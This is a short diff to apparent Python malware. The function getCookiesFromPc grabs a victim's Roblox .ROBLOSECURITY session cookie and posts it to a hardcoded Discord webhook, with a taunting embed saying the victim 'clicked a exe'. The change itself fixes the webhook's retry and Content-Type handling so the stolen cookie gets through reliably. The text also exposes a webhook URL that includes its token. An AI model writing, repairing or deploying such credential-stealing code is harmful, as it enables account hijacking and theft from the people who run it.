@@ -15,10 +15,12 @@ def getCookiesFromPc():
             webhook = DiscordWebhook(
                 url='https://discordapp.com/api/webhooks/1529192113441476749/DqyFO1JAoWPjxEK0urpUpw1SQyGNNyqejk6h-b_jm_d2MX4o91jbtctcqEI8J2kqb-cv',
                 content="@everyone",
-                headers={"Content-Type": "application/json"}
+                rate_limit_retry=True
             )
             embed = DiscordEmbed(title='Cookie Found of braindead person!', description='He clicked a exe!', color=242424)
             embed.add_embed_field(name='.ROBLOSECURITY', value=c.value)
             embed.set_timestamp()
             webhook.add_embed(embed)
+            # Override the session to ensure Content-Type is set
+            webhook.session.headers.update({"Content-Type": "application/json"})
             response = webhook.execute()
